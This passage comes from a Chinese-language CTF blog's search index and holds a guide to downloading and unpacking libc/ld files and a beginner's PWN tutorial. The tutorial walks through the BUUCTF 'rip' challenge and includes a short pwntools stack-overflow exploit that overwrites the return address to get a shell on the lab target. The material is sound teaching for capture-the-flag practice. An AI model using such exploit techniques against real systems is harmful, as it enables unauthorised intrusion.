- 博客园 (cnblogs.com)</a><br><a href="https://www.yuque.com/cyberangel/rg9gdm/yom93l">PWN入门（1-1-2）-bss段、data段、text段、堆(heap)和栈(stack) (yuque.com)</a><br><a href="https://zhuanlan.zhihu.com/p/664901746">在x86架构中的寄存器 - 知乎 (zhihu.com)</a><br><a href="https://blog.csdn.net/qq_65596720/article/details/130743499">什么是栈，为什么函数式编程语言都离不开栈？_没有栈,都是跟栈有什么关系-CSDN博客</a><br><a href="https://www.yuque.com/cyberangel/rg9gdm/gcz7x2">PWN入门（1-1-1）-C函数调用过程原理及函数栈帧分析（Intel） (yuque.com)</a><br><a href="https://segmentfault.com/a/1190000007977460">linux - C函数调用过程原理及函数栈帧分析 - 编程之道 - SegmentFault 思否</a></p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何搜索下载libc以及其对应的ld文件</title>
      <link href="/2024/06/13/%E5%A6%82%E4%BD%95%E6%90%9C%E7%B4%A2%E4%B8%8B%E8%BD%BDlibc%E4%BB%A5%E5%8F%8A%E5%85%B6%E5%AF%B9%E5%BA%94%E7%9A%84ld%E6%96%87%E4%BB%B6/"/>
      <url>/2024/06/13/%E5%A6%82%E4%BD%95%E6%90%9C%E7%B4%A2%E4%B8%8B%E8%BD%BDlibc%E4%BB%A5%E5%8F%8A%E5%85%B6%E5%AF%B9%E5%BA%94%E7%9A%84ld%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h3 id="查找网站"><a href="#查找网站" class="headerlink" title="查找网站"></a>查找网站</h3><p>推荐使用下面的网址<br><code>https://launchpad.net/ubuntu/focal/amd64/libc6</code><br>网站页面如下:<br><img src="/../picture/talk1.1.0/1.png"></p><h3 id="如何搜索"><a href="#如何搜索" class="headerlink" title="如何搜索"></a>如何搜索</h3><p>我们需要使用URL来直接进行版本的搜索<br><code>https://launchpad.net/ubuntu/版本/amd64/libc6</code><br>我们只需要修改上面的 <code>版本</code> 就可以替换对不同版本的libc进行查找<br>下面是不同的版本名称<br><img src="/../picture/talk1.1.0/2.png"><br>也就是我们分别将 <code>版本</code> 修改为 :<br><code>plucky</code> <code>oracular</code> <code>noble</code> 等就可以查到对应的Ubuntu版本所使用的历史libc版本</p><p>下面使用 <code>Ubuntu20</code> 版本来举例<br>比如我们想要找一个glibc版本为2.31的glibc<br>那么2.31的glibc应该是对应的Ubuntu20版本<br>那么我们就将版本修改为 <code>focal</code> 也就是URL修改为(注意这里focal必须全部小写)<br><code>https://launchpad.net/ubuntu/focal/amd64/libc6</code></p><p>然后就会看到不同的glibc版本，选择我们需要的版本，点击进入<br><img src="/../picture/talk1.1.0/3.png"></p><p>这里我们使用 <code>2.31-0ubuntu9.15</code> 来举例<br>进入后我们点击右侧的deb文件下载<br><img src="/../picture/talk1.1.0/4.png"></p><h3 id="如何解压"><a href="#如何解压" class="headerlink" title="如何解压"></a>如何解压</h3><p>下载之后，我们放入自己的Ubuntu虚拟机中，使用<code>dpkg -X</code>指令来解压这个deb文件<br>具体解压指令如下:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> dpkg -X 文件名称 解压地址</span><br><span class="line">比如:</span><br><span class="line"><span class="built_in">sudo</span> dpkg -X libc6_2.31-0ubuntu9.15_amd64.deb ./libc-2.31</span><br></pre></td></tr></table></figure><p>解压之后进入<code>libc-2.31</code>文件夹，里面有<code>lib</code>文件夹，进入<code>lib</code>文件夹看见<code>x86_64-linux-gnu</code>文件夹，再次进入其中就可以看见一大堆文件<br><img src="/../picture/talk1.1.0/5.png"><br>然后就可以看到里面两个绿绿的东西就是我们需要的ld文件和libc文件，后续就是使用patchlf工具来跟换libc，这里不过多介绍</p><h3 id="如何查看版本"><a href="#如何查看版本" class="headerlink" title="如何查看版本"></a>如何查看版本</h3><p>我们在做一些题目的时候往往只有libc文件，没有对应的ld文件，那么我们该如何快速知道这个libc文件是什么版本的呢？<br>下面介绍一种方法</p><p>通过libc文件来查找libc版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings libc.so.6 | grep &quot;Ub&quot;</span><br></pre></td></tr></table></figure><p>如下图所示<br><img src="/../picture/talk1.1.0/6.png"><br>所以我们就可以知道这个libc.so.6的版本是<code>Ubuntu GLIBC 2.31-0ubuntu9.15</code></p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> 杂 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> libc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN入门手册</title>
      <link href="/2024/06/12/PWN%E5%85%A5%E9%97%A8%E6%89%8B%E5%86%8C/"/>
      <url>/2024/06/12/PWN%E5%85%A5%E9%97%A8%E6%89%8B%E5%86%8C/</url>
      
        <content type="html"><![CDATA[<h3 id="什么是-PWN？"><a href="#什么是-PWN？" class="headerlink" title="什么是 PWN？"></a>什么是 PWN？</h3><p><code>PWN</code> 是黑客术语中的俚语，是指攻破设备或者系统。它的发音类似于<code>“砰”</code>，当然也有师傅把它叫作<code>“胖”</code>。PWN 的目标是获取系统的控制权或执行未经授权的操作。</p><h3 id="如何入门-PWN"><a href="#如何入门-PWN" class="headerlink" title="如何入门 PWN"></a>如何入门 PWN</h3><h4 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h4><ol><li><p><strong>C 语言</strong></p><ul><li><strong>学习内容</strong>：<ul><li>程序结构和基础语法</li><li>数据类型、分支语句（如 <code>if</code>、<code>switch</code>）和循环（如 <code>for</code>、<code>while</code>）</li><li>指针和结构体</li></ul></li><li><strong>学习资源</strong>：<ul><li><a href="https://www.bilibili.com/video/BV1dr4y1n7vA/?spm_id_from=333.337.search-card.all.click&vd_source=4276fc17276ff66d44a2713a1ca58c94">浙江大学翁恺教你 C 语言程序设计</a></li><li><a href="https://www.runoob.com/cprogramming/c-tutorial.html">C 语言教程 | 菜鸟教程</a></li></ul></li></ul></li><li><p><strong>Python 语言</strong></p><ul><li><strong>学习内容</strong>：<ul><li>程序结构和基础语法</li><li>循环（<code>for</code>、<code>while</code>）和异常处理（如 <code>try</code>）</li></ul></li><li><strong>学习资源</strong>：<ul><li><a href="https://www.runoob.com/python3/python3-tutorial.html">Python3 教程 | 菜鸟教程</a></li><li><a href="https://www.bilibili.com/video/BV1944y1x7SW/?spm_id_from=333.337.search-card.all.click&vd_source=4276fc17276ff66d44a2713a1ca58c94">超基础 Python 课程</a></li></ul></li></ul><p> <strong>建议</strong>：掌握 C 语言后，可以直接用文章进行 Python 的学习，进度会更快。 </p></li><li><p><strong>汇编语言</strong></p><ul><li><strong>常见类型</strong>：<ul><li><strong>x86 汇编</strong>：Intel 和 AMD 的处理器架构</li><li><strong>ARM 汇编</strong>：用于移动设备</li><li><strong>MIPS 汇编</strong>：用于嵌入式系统</li><li><strong>PowerPC 汇编</strong>：曾用于苹果计算机</li><li><strong>RISC-V 汇编</strong>：开源架构，逐渐获得关注</li></ul></li><li><strong>学习资源</strong>：<ul><li><a href="https://www.bilibili.com/video/BV1eG4y1S7R5/?spm_id_from=333.337.search-card.all.click&vd_source=4276fc17276ff66d44a2713a1ca58c94">《汇编语言》速成指南</a></li><li><a href="https://www.bilibili.com/video/BV1Wu411B72F/?spm_id_from=333.337.search-card.all.click&vd_source=4276fc17276ff66d44a2713a1ca58c94">通俗易懂的汇编语言（王爽老师的书）</a></li></ul></li></ul><p> <strong>基础要求</strong>：理解基本的汇编指令（如 <code>pop</code>、<code>push</code>、<code>jmp</code>）和程序流程即可。 </p></li><li><p><strong>ELF 相关知识</strong></p><ul><li><strong>学习内容</strong>：<ul><li>ELF 文件的组成部分</li><li>各部分的作用</li><li>常用的保护机制</li></ul></li><li><strong>学习资源</strong>：<br>  在后续文章中会有简单介绍</li></ul></li><li><p><strong>Linux 操作系统基础</strong></p><ul><li><strong>学习内容</strong>：<ul><li>基本的 Linux 命令（如 <code>cd</code>、<code>ls</code>、<code>cat</code>）</li><li>系统调用函数（如 <code>execve</code>）</li><li>glibc 库</li></ul></li><li><strong>学习资源</strong>：<br>  在后续文章中会有简单介绍</li></ul><p> <strong>基础要求</strong>：能够使用基本的 Linux 命令，了解系统调用函数和 glibc 库的基本知识。</p></li></ol><h4 id="工具和资源"><a href="#工具和资源" class="headerlink" title="工具和资源"></a>工具和资源</h4><ol><li><p><strong>虚拟机和操作系统</strong>：</p><ul><li><strong>建议</strong>：搭建一个 <code>Ubuntu</code> 虚拟机环境，以便调试和解决题目。</li><li>尽管大部分题目都使用Ubuntu环境，但这并不意味着你必须要使用 Ubuntu 作为你的主力操作系统 。你仍旧可以选择继续使用你喜欢的其他 Linux 发行版（如，Arch、Debian、openSUSE、Fedora、NixOS 等）然后使用 <code>Docker</code> 来模拟 <code>Ubuntu</code> 环境</li></ul></li><li><p><strong>工具</strong>：</p><ul><li><strong>IDA</strong>：逆向分析工具</li><li><strong>Python + pwntools</strong>：用于编写漏洞利用脚本</li><li><strong>gdb + pwndbg&#x2F;peda</strong>：用于调试二进制文件</li><li><strong>QEMU</strong>：有些题目需要它来模拟环境(对于基础入门并不是必须的工具)</li></ul><p> <strong>注意</strong>：入门阶段不需要配置复杂的环境，基础的调试和利用工具足够。</p></li></ol><h4 id="PWN-大致内容"><a href="#PWN-大致内容" class="headerlink" title="PWN 大致内容"></a>PWN 大致内容</h4><ul><li><strong>栈溢出与 ROP 链</strong>：理解栈溢出漏洞和如何利用返回-oriented programming（ROP）来绕过安全保护机制。</li><li><strong>格式化字符串</strong>：学习如何利用格式化字符串漏洞来进行攻击。</li><li><strong>整数安全</strong>：了解整数溢出等安全问题。</li><li><strong>堆漏洞利用</strong>：探索如何利用堆上的漏洞进行攻击。</li><li><strong>异架构</strong>：理解不同架构（如 x86、ARM）的特点和攻击方法。</li><li><strong>内核漏洞</strong>：深入研究内核漏洞 (可能这并不基础…)</li></ul><h3 id="做PWN题的大致流程"><a href="#做PWN题的大致流程" class="headerlink" title="做PWN题的大致流程"></a>做PWN题的大致流程</h3><p>这里使用buuctf中PWN板块的第二题<code>rip</code>为例子:<a href="https://buuoj.cn/challenges#rip">BUUCTF在线评测 (buuoj.cn)</a></p><h5 id="1-下载和启动靶机"><a href="#1-下载和启动靶机" class="headerlink" title="1. 下载和启动靶机"></a>1. 下载和启动靶机</h5><p>点开题目，里面会有一个可以下载的文件，以及<code>启动靶机</code>四个大字。如下图:<br><img src="/../picture/pwn1.0.0/1.png"></p><h5 id="2-将文件传入Linux虚拟机"><a href="#2-将文件传入Linux虚拟机" class="headerlink" title="2. 将文件传入Linux虚拟机"></a>2. 将文件传入Linux虚拟机</h5><p>打开Linux虚拟机,下载这个附件并将这个附件传入到Linux虚拟机中。此时我们可以看到这个附件叫<code>pwn1</code></p><h5 id="3-检查二进制文件的安全性和架构"><a href="#3-检查二进制文件的安全性和架构" class="headerlink" title="3. 检查二进制文件的安全性和架构"></a>3. 检查二进制文件的安全性和架构</h5><p>使用<code>checksec</code>工具(安装<code>pwntools</code>后就有了)去查看它的架构和位数以及保护开启的情况，这里因为是基础题所以什么保护都没有<br><img src="/../picture/pwn1.0.0/2.png"></p><h5 id="4-反编译和分析二进制文件"><a href="#4-反编译和分析二进制文件" class="headerlink" title="4. 反编译和分析二进制文件"></a>4. 反编译和分析二进制文件</h5><p>将文件拖动到IDA这类反编译工具中，对二进制文件进行反编译<br>下图中这个非常有魅力的女人头像的工具就是我们的IDA<br><img src="/../picture/pwn1.0.0/3.png"><br>刚刚我们通过<code>checksec</code>已经知道了<code>pwn1</code>他是64位的，那么就拖入64位的IDA中(其实如果你拖错了，IDA会提示你搞错了，所以<code>checksec</code>的主要功能是查看开启了什么保护)</p><p>拖入后会看到这个画面，直接<code>OK</code>就完事了<br><img src="/../picture/pwn1.0.0/4.png"><br>然后进入后，我们在左侧的Functions栏里面找到main函数并点击他<br><img src="/../picture/pwn1.0.0/5.png"><br>选中main函数后，按TAB键(一般在Q的左边)或者按F5键，此时就会显示<code>伪C语言代码</code><br><img src="/../picture/pwn1.0.0/6.png"></p><h5 id="5-理解代码和找出漏洞"><a href="#5-理解代码和找出漏洞" class="headerlink" title="5. 理解代码和找出漏洞"></a>5. 理解代码和找出漏洞</h5><p>看懂代码(需要学习C语言)，找出漏洞(需要学习相关的PWN知识),编写python脚本(需要学习python语言和使用pwntools等库)<br>pwntools的使用后续会进行介绍</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#PWN1 exp</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn1&#x27;) # 本地</span></span><br><span class="line">io = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28735</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">15</span></span><br><span class="line">payload +=p64(<span class="number">0x401186</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>这里我编写了python脚本，并将其命名为<code>exp.py</code></p><h5 id="6-创建靶机并运行脚本尝试攻击"><a href="#6-创建靶机并运行脚本尝试攻击" class="headerlink" title="6. 创建靶机并运行脚本尝试攻击"></a>6. 创建靶机并运行脚本尝试攻击</h5><ul><li>**使用<code>nc</code>**：用<code>nc</code>命令连接靶机（如<code>nc node5.buuoj.cn 28735</code>）进行测试。<ul><li><strong>测试脚本</strong>：将脚本中的地址和端口替换为靶机提供的实际地址和端口。</li><li><strong>检查结果</strong>：确认脚本是否能正确获取flag，解决<code>EOF</code>错误的问题。</li></ul></li></ul><p>点击<code>启动靶机</code><br><img src="/../picture/pwn1.0.0/7.png"><br>会得到一串nc地址，这个可以在Linux中使用<code>nc</code>工具进行连接<br><img src="/../picture/pwn1.0.0/8.png"><br>这里我们使用python脚本去攻击它的时候，需要将其放入python脚本中<br>比如:<code>io = remote(&#39;node5.buuoj.cn&#39;,28735)</code><br>我们尝试运行这个脚本<br><img src="/../picture/pwn1.0.0/9.png"><br>然后输入指令cat flag就可以拿到我们想要的东西了，复制flag去平台提交即可<br><img src="/../picture/pwn1.0.0/10.png"></p><p>如果没有打通的话会输出提示<br><code>[*] Got EOF while reading in interactive</code><br>表示连接断开了，此时你输入cat flag是没有用的<br><img src="/../picture/pwn1.0.0/11.png"></p><h3 id="刷题平台推荐"><a href="#刷题平台推荐" class="headerlink" title="刷题平台推荐"></a>刷题平台推荐</h3><p><a href="https://buuoj.cn/challenges">BUUCTF在线评测 (buuoj.cn)</a><br><a href="https://www.nssctf.cn/problem">题库 | NSSCTF</a><br><a href="https://pwn.college/fundamentals/program-misuse">pwn.college</a><br><a href="https://ctf.show/challenges#">ctf.show</a></p><p>其中<code>ctfshow</code>大部分题目是收费的，但是里面的题目较为系统化，从简单到困难，因此我个人比较推荐</p><h4 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h4><ul><li><a href="https://ns.openctf.net/learn/pwn.html#elf-%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86">Pwn | 快速入门 - NewStar CTF</a></li><li><a href="https://ctf-wiki.org/pwn/linux/user-mode/environment/#peda">Environment - CTF Wiki (ctf-wiki.org)</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>我的朋友们</title>
      <link href="/link/index.html"/>
      <url>/link/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>文章标签</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>文章分类</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>about</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
